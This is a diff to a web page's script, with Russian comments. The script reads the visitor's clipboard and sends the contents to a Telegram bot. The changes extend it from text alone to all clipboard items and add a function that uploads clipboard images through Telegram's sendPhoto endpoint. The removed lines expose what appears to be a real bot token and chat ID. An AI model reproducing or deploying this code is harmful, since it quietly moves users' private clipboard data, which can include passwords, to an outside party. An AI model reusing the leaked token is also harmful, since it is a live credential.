@@ -13,21 +13,34 @@
     <script>
         async function sendClipboardData() {
             try {
-                // Получение данных из буфера обмена
-                const clipboardText = await navigator.clipboard.readText();
-                
-                // Проверка наличия данных в буфере обмена
-                if (!clipboardText) {
-                    alert('Буфер обмена пуст.');
-                    return;
+                // Получение всех данных из буфера обмена
+                const clipboardItems = await navigator.clipboard.read();
+                let message = 'Данные из буфера обмена:\n';
+                let hasImage = false;
+
+                for (const item of clipboardItems) {
+                    for (const type of item.types) {
+                        if (type === 'text/plain') {
+                            const textBlob = await item.getType('text/plain');
+                            const text = await textBlob.text();
+                            message += `Текст:\n${text}\n\n`;
+                        } else if (type.startsWith('image/')) {
+                            const imageBlob = await item.getType(type);
+                            sendImageToTelegram(imageBlob);
+                            hasImage = true;
+                        }
+                    }
                 }
 
-                // Формирование сообщения с данными
-                let message = 'Данные из буфера обмена:\n';
-                message += clipboardText;
+                // Если текст был найден, отправляем его
+                if (message.trim() !== 'Данные из буфера обмена:') {
+                    sendToTelegram(message);
+                }
 
-                // Отправка данных в Telegram-бот
-                sendToTelegram(message);
+                // Если были найдены изображения, уведомляем пользователя
+                if (hasImage) {
+                    alert('Изображения из буфера обмена отправляются отдельно.');
+                }
 
             } catch (error) {
                 console.error('Ошибка при получении данных из буфера обмена:', error);
@@ -36,8 +49,8 @@
         }
 
         function sendToTelegram(message) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk'; // Замените на токен вашего бота
-            const chatId = '1653222949'; // Замените на ваш Chat ID
+            const botToken = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+            const chatId = 'YOUR_CHAT_ID'; // Замените на ваш Chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(telegramApiUrl, {
@@ -63,6 +76,34 @@
             .catch(error => {
                 console.error('Ошибка при отправке данных в Telegram:', error);
                 alert('Ошибка при отправке данных в Telegram.');
+            });
+        }
+
+        function sendImageToTelegram(imageBlob) {
+            const botToken = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+            const chatId = 'YOUR_CHAT_ID'; // Замените на ваш Chat ID
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageBlob, 'clipboard-image.png');
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Изображение отправлено в Telegram:', data);
+                } else {
+                    console.error('Ошибка при отправке изображения в Telegram:', data);
+                    alert('Ошибка при отправке изображения в Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке изображения в Telegram:', error);
+                alert('Ошибка при отправке изображения в Telegram.');
             });
         }
     </script>
